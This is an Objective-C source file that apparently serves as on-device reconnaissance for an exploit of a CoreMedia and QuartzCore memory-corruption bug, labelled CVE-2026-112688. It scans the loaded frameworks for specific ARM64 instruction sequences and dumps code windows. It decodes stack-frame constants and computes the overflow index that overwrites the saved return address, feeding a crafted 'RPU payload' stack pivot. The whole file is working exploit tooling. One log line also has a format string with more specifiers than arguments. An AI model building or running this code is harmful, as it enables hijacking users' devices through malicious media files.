// Qc.m - read the CVE-2026-112688 constants off the loaded QuartzCore.

#import "Qc.h"

#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <mach-o/loader.h>
#import <QuartzCore/QuartzCore.h>
#import <string.h>

static NSString *gQcDocs;
static NSMutableArray *gQcLines;

static void qcNote(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    [gQcLines addObject:s];
    NSLog(@"[qc] %@", s);
}

#define W_CBZ_X8_0C   0xB4000068u   // cbz   x8, +0xc
#define W_MOV_W9_1    0x52800029u   // mov   w9, #1
#define W_STRB_W9_X8  0x39000109u   // strb  w9, [x8]
#define W_STRB_WZR_SP 0x3903ABFFu   // strb  wzr, [sp, #0xea]
#define W_ADD_X9_SP   0x9103ABE9u   // add   x9, sp, #0xea
#define W_PACIBSP     0xD503233Fu
#define W_SUBSP380    0xD10E03FFu   // sub   sp, sp, #0x380

static uint32_t wordAt(const uint8_t *t, NSUInteger off) {
    uint32_t w = 0;
    memcpy(&w, t + off, 4);
    return w;
}

static NSString *uuidString(const struct mach_header_64 *h) {
    const uint8_t *p = (const uint8_t *)(h + 1);
    for (uint32_t i = 0; i < h->ncmds; i++) {
        const struct load_command *lc = (const struct load_command *)p;
        if (lc->cmd == LC_UUID) {
            const struct uuid_command *u = (const struct uuid_command *)lc;
            return [NSString stringWithFormat:
                    @"%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X",
                    u->uuid[0], u->uuid[1], u->uuid[2],  u->uuid[3],
                    u->uuid[4], u->uuid[5], u->uuid[6],  u->uuid[7],
                    u->uuid[8], u->uuid[9], u->uuid[10], u->uuid[11],
                    u->uuid[12], u->uuid[13], u->uuid[14], u->uuid[15]];
        }
        p += lc->cmdsize;
    }
    return @"?";
}

int qcRun(void) {
    gQcDocs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    gQcLines = [NSMutableArray array];
    qcNote(@"=== qc start ===");

    void *handle = dlopen("/System/Library/Frameworks/QuartzCore.framework/QuartzCore", RTLD_NOW);
    if (handle == NULL) {
        qcNote(@"dlopen failed: %s", dlerror());
        goto writeout;
    }

    void *sym = dlsym(handle, "CACurrentMediaTime");
    Dl_info info;
    if (sym == NULL || dladdr(sym, &info) == 0 || info.dli_fbase == NULL) {
        qcNote(@"dladdr failed");
        goto writeout;
    }

    const struct mach_header_64 *h = (const struct mach_header_64 *)info.dli_fbase;
    if (h->magic != MH_MAGIC_64) { qcNote(@"bad magic"); goto writeout; }
    qcNote(@"base=%p uuid=%@", info.dli_fbase, uuidString(h));

    const uint8_t *text = (const uint8_t *)info.dli_fbase;
    uint64_t textVM = 0, textSize = 0;
    const uint8_t *p = (const uint8_t *)(h + 1);
    for (uint32_t i = 0; i < h->ncmds; i++) {
        const struct load_command *lc = (const struct load_command *)p;
        if (lc->cmd == LC_SEGMENT_64) {
            const struct segment_command_64 *seg = (const struct segment_command_64 *)lc;
            if (strcmp(seg->segname, "__TEXT") == 0) {
                textVM = seg->vmaddr;
                textSize = seg->vmsize;
                break;
            }
        }
        p += lc->cmdsize;
    }
    if (textSize == 0) { qcNote(@"__TEXT missing"); goto writeout; }
    qcNote(@"__TEXT vmaddr=%#llx size=%#llx slide=%#llx",
           textVM, textSize, (uint64_t)((uintptr_t)info.dli_fbase - textVM));

    // 1. tonemap write site, anchored on the triple
    NSUInteger sites[8];
    NSUInteger nSites = 0;
    for (NSUInteger off = 8; off + 4 < (NSUInteger)textSize && nSites < 8; off += 4) {
        if (wordAt(text, off)     != W_STRB_W9_X8)  continue;
        if (wordAt(text, off - 4) != W_MOV_W9_1)    continue;
        if (wordAt(text, off - 8) != W_CBZ_X8_0C)   continue;
        sites[nSites++] = off;
        qcNote(@"TRIPLE site=%#llx", textVM + off);
    }
    qcNote(@"triples=%lu", (unsigned long)nSites);

    // 2. for the first triple, find the function entry and the caller anchor
    if (nSites == 0) goto writeout;
    NSUInteger site = sites[0];

    uint64_t funcVM = 0;
    for (NSUInteger back = 4; back <= 0x4000 && back <= site; back += 4) {
        uint32_t w = wordAt(text, site - back);
        if (w == W_PACIBSP || w == W_SUBSP380) {
            funcVM = textVM + (site - back);
            qcNote(@"FUNC entry=%#llx via %s", funcVM,
                   w == W_PACIBSP ? "pacibsp" : "sub sp,#0x380");
            break;
        }
    }
    if (funcVM) {
        qcNote(@"DELTA site-func=%#llx", (textVM + site) - funcVM);
    }

    // 3. caller frame anchors near the site
    NSUInteger lo = (site > 0x4000) ? site - 0x4000 : 0;
    NSUInteger hi = site + 0x4000;
    if (hi > (NSUInteger)textSize - 4) hi = (NSUInteger)textSize - 4;
    for (NSUInteger off = lo; off < hi; off += 4) {
        uint32_t w = wordAt(text, off);
        if (w == W_STRB_WZR_SP) qcNote(@"ANCHOR strb wzr,[sp,#0xea] at %#llx", textVM + off);
        if (w == W_ADD_X9_SP)   qcNote(@"ANCHOR add x9,sp,#0xea     at %#llx", textVM + off);
    }

writeout:
    qcNote(@"=== qc end ===");
    NSString *out = [[gQcLines componentsJoinedByString:@"\n"] stringByAppendingString:@"\n"];
    [[out dataUsingEncoding:NSUTF8StringEncoding]
        writeToFile:[gQcDocs stringByAppendingPathComponent:@"qc.log"] atomically:YES];
    return 0;
}

#pragma mark - CoreMedia side of the payload

// The RPU payload is built against CoreMedia's parser frame, not QuartzCore:
//   craft_l8_pivot_l10_stack INPUT OUTPUT [INDEX FIRST SECOND]
//   INDEX = number of L10 records (default 42), i.e. which record overruns.
// Upstream evidence for 27.1, inside the DV metadata writer:
//   0x18ec66ef8  mov   w10, #0x7338        array base
//   0x18ec66f00  mov   w11, #0x1c           record stride
//   0x18ec66f04  umull x8, w8, w11          index * stride
//   0x18ec66f08  add   x23, x8, #4
//   0x18ec66f0c  addpt x11, x10, x23
//   0x18ec66f10  strb  w9, [x11]            the overflow store
// Locating that site on this build gives the array base and stride; dumping a
// window around it lets the frame layout be recovered offline.
int cmRun(void) {
    gQcDocs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    if (gQcLines == nil) gQcLines = [NSMutableArray array];
    NSString *outDir = [gQcDocs stringByAppendingPathComponent:@"out"];
    [[NSFileManager defaultManager] createDirectoryAtPath:outDir
                             withIntermediateDirectories:YES attributes:nil error:nil];

    qcNote(@"=== cm start ===");

    void *cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia", RTLD_NOW);
    if (cm == NULL) { qcNote(@"dlopen CoreMedia failed: %s", dlerror()); goto cmdone; }

    // Any symbol inside the framework gives us the image base.
    void *sym = dlsym(cm, "CMTimeMake");
    Dl_info info;
    if (sym == NULL || dladdr(sym, &info) == 0 || info.dli_fbase == NULL) {
        qcNote(@"cm dladdr failed"); goto cmdone;
    }
    const struct mach_header_64 *h = (const struct mach_header_64 *)info.dli_fbase;
    if (h->magic != MH_MAGIC_64) { qcNote(@"cm bad magic"); goto cmdone; }
    qcNote(@"cm base=%p uuid=%@", info.dli_fbase, uuidString(h));

    const uint8_t *t = (const uint8_t *)info.dli_fbase;
    uint64_t textVM = 0, textSize = 0;
    const uint8_t *p = (const uint8_t *)(h + 1);
    for (uint32_t i = 0; i < h->ncmds; i++) {
        const struct load_command *lc = (const struct load_command *)p;
        if (lc->cmd == LC_SEGMENT_64) {
            const struct segment_command_64 *seg = (const struct segment_command_64 *)lc;
            if (strcmp(seg->segname, "__TEXT") == 0) { textVM = seg->vmaddr; textSize = seg->vmsize; break; }
        }
        p += lc->cmdsize;
    }
    if (textSize == 0) { qcNote(@"cm __TEXT missing"); goto cmdone; }
    qcNote(@"cm __TEXT vmaddr=%#llx size=%#llx slide=%#llx",
           textVM, textSize, (uint64_t)((uintptr_t)info.dli_fbase - textVM));

    // umull x8, w8, w11 = 0x9BAB7D08 ; strb w9,[x11] = 0x39000169
    NSUInteger site = 0;
    for (NSUInteger off = 0; off + 16 < (NSUInteger)textSize; off += 4) {
        if (wordAt(t, off) != 0x9BAB7D08u) continue;
        if (wordAt(t, off + 12) != 0x39000169u) continue;
        site = off;
        break;
    }
    if (site == 0) { qcNote(@"cm: DV index write site not found"); goto cmdone; }
    qcNote(@"cm SITE=%#llx", textVM + site);

    // Dump a window so the frame can be analysed offline.
    NSUInteger lo = (site > 0x1000) ? site - 0x1000 : 0;
    NSUInteger hi = site + 0x1000;
    if (hi > (NSUInteger)textSize) hi = (NSUInteger)textSize;
    NSData *win = [NSData dataWithBytes:(t + lo) length:(hi - lo)];
    NSString *name = @"cm_window.bin";
    if ([win writeToFile:[outDir stringByAppendingPathComponent:name] atomically:YES]) {
        qcNote(@"cm window %lu B -> out/%@ (vma %#llx .. %#llx)",
               (unsigned long)win.length, name, textVM + lo, textVM + hi);
    }

    // Decode the few instruction forms that carry the frame constants, so the
    // numbers are available without pulling the window off the device.
    uint32_t baseOff = 0, stride = 0, field = 0, frame = 0;
    BOOL haveBase = NO, haveStride = NO, haveField = NO, haveFrame = NO;
    for (NSUInteger off = lo; off + 4 <= hi; off += 4) {
        uint32_t w = wordAt(t, off);

        // movz wN, #imm16
        if ((w & 0xFF800000u) == 0x52800000u) {
            int rd = (int)(w & 0x1Fu);
            uint32_t imm = (w >> 5) & 0xFFFFu;
            if (rd == 10 && !haveBase) { baseOff = imm; haveBase = YES;
                qcNote(@"cm mov w10,#%#x  @%#llx", imm, textVM + off); }
            if (rd == 11 && !haveStride) { stride = imm; haveStride = YES;
                qcNote(@"cm mov w11,#%#x  @%#llx", imm, textVM + off); }
        }

        // add x23, x8, #imm12
        if ((w & 0xFF800000u) == 0x91000000u) {
            int rn = (int)((w >> 5) & 0x1Fu), rd = (int)(w & 0x1Fu);
            uint32_t imm = (w >> 10) & 0xFFFu;
            if (rn == 8 && rd == 23 && !haveField) { field = imm; haveField = YES;
                qcNote(@"cm add x23,x8,#%#x  @%#llx", imm, textVM + off); }
        }

        // sub sp, sp, #imm12
        if ((w & 0xFF8003FFu) == 0xD10003FFu) {
            uint32_t imm = (w >> 10) & 0xFFFu;
            if (!haveFrame) { frame = imm; haveFrame = YES;
                qcNote(@"cm sub sp,sp,#%#x  @%#llx", imm, textVM + off); }
        }
    }

    qcNote(@"cm base=%s%#x stride=%s%#x field=%s%#x frame=%s%#x",
           haveBase ? "" : "?", baseOff, haveStride ? "" : "?", stride,
           haveField ? "" : "?", field, haveFrame ? "" : "?", frame);

    if (haveBase && haveStride && haveField && haveFrame) {
        // The last L10 record written is index+1; solve for the index whose
        // second qword lands on the saved-LR slot at the top of the frame.
        long idx = (long)((frame - baseOff - field) / stride);
        qcNote(@"cm candidate INDEX=%ld (frame-base-field)/stride", idx);
        qcNote(@"cm try INDEX around %ld: %ld %ld %ld", idx, idx - 1, idx + 1);
    }

cmdone:
    qcNote(@"=== cm end ===");
    NSString *out = [[gQcLines componentsJoinedByString:@"\n"] stringByAppendingString:@"\n"];
    [[out dataUsingEncoding:NSUTF8StringEncoding]
        writeToFile:[gQcDocs stringByAppendingPathComponent:@"cm.log"] atomically:YES];
    return 0;
}
